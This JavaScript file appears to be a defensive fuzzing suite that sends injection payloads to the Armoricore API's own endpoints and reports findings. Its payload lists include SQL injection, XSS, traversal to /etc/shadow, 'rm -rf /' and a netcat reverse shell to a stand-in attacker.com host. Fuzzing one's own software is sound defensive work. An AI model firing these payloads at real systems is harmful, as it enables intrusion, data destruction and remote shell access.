// Copyright 2025 Francisco F. Pinochet
// Copyright 2026 Fastcomcorp, LLC

/**
 * Advanced Fuzzing Test Suite for Armoricore
 * Generates and tests various malicious inputs against API endpoints
 */

const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');

class ArmoricoreFuzzer {
    constructor(baseUrl = 'http://localhost:4000') {
        this.baseUrl = baseUrl;
        this.apiUrl = `${baseUrl}/api/v1`;
        this.results = [];
        this.vulnerabilities = [];
    }

    // Comprehensive fuzzing payloads
    getFuzzPayloads() {
        return {
            // Basic injection attacks
            sql: [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM users --",
                "admin' --",
                "') OR ('1'='1",
                "' HAVING 1=1 --"
            ],

            // XSS payloads
            xss: [
                "<script>alert('xss')</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert('xss')",
                "<iframe src='javascript:alert(1)'></iframe>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "<div style=\"background-image: url(javascript:alert(1))\">",
                "<meta http-equiv=\"refresh\" content=\"0; url=javascript:alert(1)\">"
            ],

            // Path traversal
            traversal: [
                "../../../etc/passwd",
                "../../../../windows/system32/cmd.exe",
                "../../../../../../etc/shadow",
                "..\\..\\..\\..\\windows\\system32\\config\\sam"
            ],

            // Command injection
            command: [
                "; ls -la",
                "| cat /etc/passwd",
                "`whoami`",
                "$(cat /etc/passwd)",
                "; rm -rf /",
                "| nc -e /bin/sh attacker.com 4444"
            ],

            // Template injection
            template: [
                "{{7*7}}",
                "{{config}}",
                "{{self.__class__.__mro__[1].__subclasses__()}}",
                "${7*7}",
                "<%= 7*7 %>"
            ],

            // JSON/XML attacks
            json: [
                '{"__proto__": {"isAdmin": true}}',
                '{"constructor": {"prototype": {"isAdmin": true}}}',
                '{"length": 1000000}',
                '{"__proto__.toString": "polluted"}'
            ],

            // Buffer overflow attempts
            buffer: [
                'A'.repeat(10000),
                'A'.repeat(100000),
                '\x00'.repeat(1000),
                '\xFF'.repeat(1000)
            ],

            // Unicode attacks
            unicode: [
                "🏴‍☠️🔥💀",
                "Ǎǒǔ",
                "Ǎ".repeat(100),
                "\u0000\u0001\u0002",
                "\uFFFF\uFFFE\uFFFD"
            ],

            // Format string attacks
            format: [
                "%s%s%s%s%s%s%s%s%s%s%s%s",
                "%n%n%n%n",
                "%x%x%x%x",
                "%p%p%p%p"
            ],

            // LDAP injection
            ldap: [
                "*)(uid=*))(|(uid=*",
                "*)(&(objectClass=*))",
                "*)(objectClass=*))(|(objectClass=*"
            ],

            // NoSQL injection
            nosql: [
                '{"$ne": null}',
                '{"$gt": ""}',
                '{"$where": "this.password.length > 0"}',
                '{"$regex": ".*"}'
            ]
        };
    }

    // Make HTTP request with timeout
    async makeRequest(method, url, data = null, headers = {}) {
        return new Promise((resolve, reject) => {
            const urlObj = new URL(url);
            const client = urlObj.protocol === 'https:' ? https : http;

            const options = {
                hostname: urlObj.hostname,
                port: urlObj.port,
                path: urlObj.pathname + urlObj.search,
                method: method.toUpperCase(),
                headers: {
                    'User-Agent': 'ArmoricoreSecurityTest/1.0',
                    'Accept': 'application/json',
                    ...headers
                },
                timeout: 5000 // 5 second timeout
            };

            const req = client.request(options, (res) => {
                let body = '';
                res.on('data', (chunk) => {
                    body += chunk;
                });

                res.on('end', () => {
                    resolve({
                        status: res.statusCode,
                        headers: res.headers,
                        body: body
                    });
                });
            });

            req.on('error', (err) => {
                reject(err);
            });

            req.on('timeout', () => {
                req.destroy();
                reject(new Error('Request timeout'));
            });

            // Send request body if provided
            if (data) {
                if (typeof data === 'object') {
                    const jsonData = JSON.stringify(data);
                    req.setHeader('Content-Type', 'application/json');
                    req.setHeader('Content-Length', jsonData.length);
                    req.write(jsonData);
                } else {
                    req.setHeader('Content-Type', 'text/plain');
                    req.setHeader('Content-Length', data.length);
                    req.write(data);
                }
            }

            req.end();
        });
    }

    // Analyze response for vulnerabilities
    analyzeResponse(url, payload, response) {
        const findings = [];

        // Check for reflected XSS
        if (response.body && response.body.includes(payload) && response.status === 200) {
            findings.push({
                type: 'XSS_REFLECTION',
                severity: 'HIGH',
                description: 'Input reflected in response without sanitization',
                url: url,
                payload: payload,
                evidence: response.body.substring(0, 200) + '...'
            });
        }

        // Check for server errors (potential injection)
        if (response.status === 500) {
            findings.push({
                type: 'SERVER_ERROR',
                severity: 'MEDIUM',
                description: 'Server error may indicate injection vulnerability',
                url: url,
                payload: payload,
                evidence: `Status: ${response.status}`
            });
        }

        // Check for sensitive information disclosure
        const sensitivePatterns = [
            /password/i,
            /token/i,
            /secret/i,
            /key/i,
            /stack\s+trace/i,
            /sql\s+error/i,
            /database\s+error/i
        ];

        for (const pattern of sensitivePatterns) {
            if (response.body && pattern.test(response.body)) {
                findings.push({
                    type: 'INFO_DISCLOSURE',
                    severity: 'MEDIUM',
                    description: 'Sensitive information may be disclosed',
                    url: url,
                    payload: payload,
                    evidence: `Pattern: ${pattern}`
                });
                break;
            }
        }

        // Check for unusual response times (potential DoS)
        if (response.duration > 5000) { // 5 seconds
            findings.push({
                type: 'PERFORMANCE_ISSUE',
                severity: 'LOW',
                description: 'Unusually slow response time',
                url: url,
                payload: payload,
                evidence: `Duration: ${response.duration}ms`
            });
        }

        return findings;
    }

    // Test single endpoint with payload
    async testEndpoint(url, payload, method = 'GET', headers = {}) {
        try {
            const startTime = Date.now();
            const response = await this.makeRequest(method, url, payload, headers);
            const duration = Date.now() - startTime;

            response.duration = duration;

            const findings = this.analyzeResponse(url, payload, response);

            this.results.push({
                url: url,
                method: method,
                payload: payload,
                response: {
                    status: response.status,
                    duration: duration,
                    bodyLength: response.body ? response.body.length : 0
                },
                findings: findings
            });

            // Add to vulnerabilities if any found
            this.vulnerabilities.push(...findings);

            return findings.length === 0;

        } catch (error) {
            this.results.push({
                url: url,
                method: method,
                payload: payload,
                error: error.message,
                findings: [{
                    type: 'CONNECTION_ERROR',
                    severity: 'LOW',
                    description: 'Failed to connect to endpoint',
                    url: url,
                    payload: payload,
                    evidence: error.message
                }]
            });

            return false;
        }
    }

    // Run comprehensive fuzzing test
    async runComprehensiveTest(token = null) {
        console.log('🚀 Starting comprehensive fuzzing test...');
        console.log(`Target: ${this.baseUrl}`);

        const payloads = this.getFuzzPayloads();
        const endpoints = [
            { url: `${this.apiUrl}/videos/search?q={payload}`, method: 'GET' },
            { url: `${this.apiUrl}/auth/login`, method: 'POST', data: { email: '{payload}', password: 'test' } },
            { url: `${this.apiUrl}/categories`, method: 'GET' },
            { url: `${this.apiUrl}/videos`, method: 'GET' },
            { url: `${this.apiUrl}/live-streams/active`, method: 'GET' }
        ];

        const authHeaders = token ? { 'Authorization': `Bearer ${token}` } : {};

        let totalTests = 0;
        let passedTests = 0;

        // Test each payload type
        for (const [category, payloadList] of Object.entries(payloads)) {
            console.log(`\n📋 Testing ${category} payloads (${payloadList.length} tests)...`);

            for (const payload of payloadList) {
                for (const endpoint of endpoints) {
                    totalTests++;

                    // Prepare URL and data
                    let testUrl = endpoint.url.replace('{payload}', encodeURIComponent(payload));
                    let testData = null;

                    if (endpoint.data) {
                        testData = {};
                        for (const [key, value] of Object.entries(endpoint.data)) {
                            testData[key] = value.replace('{payload}', payload);
                        }
                    }

                    // Run test
                    const passed = await this.testEndpoint(testUrl, payload, endpoint.method, {
                        ...authHeaders,
                        'Content-Type': 'application/json'
                    });

                    if (passed) {
                        passedTests++;
                    } else {
                        process.stdout.write('❌');
                    }
                }
            }
        }

        console.log(`\n\n✅ Fuzzing test completed!`);
        console.log(`Total tests: ${totalTests}`);
        console.log(`Passed: ${passedTests}`);
        console.log(`Failed: ${totalTests - passedTests}`);
        console.log(`Vulnerabilities found: ${this.vulnerabilities.length}`);

        return {
            totalTests,
            passedTests,
            vulnerabilities: this.vulnerabilities,
            results: this.results
        };
    }

    // Generate HTML report
    generateHtmlReport(filename = 'fuzz_report.html') {
        const html = `
<!DOCTYPE html>
<html>
<head>
    <title>Armoricore Fuzzing Test Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .summary { background: #f0f0f0; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
        .vulnerability { border: 2px solid #ff0000; padding: 10px; margin: 10px 0; background: #ffe6e6; }
        .warning { border: 2px solid #ffa500; padding: 10px; margin: 10px 0; background: #fff3cd; }
        .info { border: 2px solid #0000ff; padding: 10px; margin: 10px 0; background: #e6f3ff; }
        table { border-collapse: collapse; width: 100%; margin-top: 20px; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .severity-HIGH { color: #ff0000; font-weight: bold; }
        .severity-MEDIUM { color: #ffa500; font-weight: bold; }
        .severity-LOW { color: #0000ff; font-weight: bold; }
    </style>
</head>
<body>
    <h1>Armoricore Fuzzing Test Report</h1>
    <div class="summary">
        <h2>Test Summary</h2>
        <p><strong>Test Date:</strong> ${new Date().toISOString()}</p>
        <p><strong>Target:</strong> ${this.baseUrl}</p>
        <p><strong>Total Tests:</strong> ${this.results.length}</p>
        <p><strong>Vulnerabilities Found:</strong> ${this.vulnerabilities.length}</p>
    </div>

    <h2>Vulnerabilities</h2>
    ${this.vulnerabilities.map(v => `
        <div class="vulnerability">
            <h3 class="severity-${v.severity}">${v.type} (${v.severity})</h3>
            <p><strong>URL:</strong> ${v.url}</p>
            <p><strong>Description:</strong> ${v.description}</p>
            <p><strong>Payload:</strong> <code>${v.payload}</code></p>
            <p><strong>Evidence:</strong> ${v.evidence}</p>
        </div>
    `).join('')}

    <h2>Detailed Results</h2>
    <table>
        <thead>
            <tr>
                <th>URL</th>
                <th>Method</th>
                <th>Status</th>
                <th>Duration</th>
                <th>Findings</th>
            </tr>
        </thead>
        <tbody>
            ${this.results.map(r => `
                <tr>
                    <td>${r.url}</td>
                    <td>${r.method}</td>
                    <td>${r.response ? r.response.status : 'ERROR'}</td>
                    <td>${r.response ? r.response.duration + 'ms' : 'N/A'}</td>
                    <td>${r.findings ? r.findings.length : 0}</td>
                </tr>
            `).join('')}
        </tbody>
    </table>
</body>
</html>`;

        fs.writeFileSync(filename, html);
        console.log(`📄 HTML report generated: ${filename}`);
    }

    // Save results to JSON
    saveResults(filename = 'fuzz_results.json') {
        const data = {
            testDate: new Date().toISOString(),
            target: this.baseUrl,
            summary: {
                totalTests: this.results.length,
                vulnerabilities: this.vulnerabilities.length,
                cleanTests: this.results.length - this.vulnerabilities.length
            },
            vulnerabilities: this.vulnerabilities,
            results: this.results
        };

        fs.writeFileSync(filename, JSON.stringify(data, null, 2));
        console.log(`💾 JSON results saved: ${filename}`);
    }
}

// CLI interface
async function main() {
    const args = process.argv.slice(2);
    const baseUrl = args[0] || 'http://localhost:4000';
    const authToken = args[1]; // Optional

    console.log('🧪 Armoricore Advanced Fuzzing Test Suite');
    console.log('=========================================');

    const fuzzer = new ArmoricoreFuzzer(baseUrl);

    try {
        const results = await fuzzer.runComprehensiveTest(authToken);

        // Generate reports
        fuzzer.generateHtmlReport();
        fuzzer.saveResults();

        console.log('\n📊 Final Results:');
        console.log(`   Tests Run: ${results.totalTests}`);
        console.log(`   Vulnerabilities: ${results.vulnerabilities.length}`);

        if (results.vulnerabilities.length === 0) {
            console.log('🎉 No vulnerabilities found!');
            process.exit(0);
        } else {
            console.log('⚠️  Vulnerabilities detected - review reports');
            process.exit(1);
        }

    } catch (error) {
        console.error('❌ Fuzzing test failed:', error.message);
        process.exit(1);
    }
}

// Export for use as module
if (require.main === module) {
    main();
} else {
    module.exports = ArmoricoreFuzzer;
}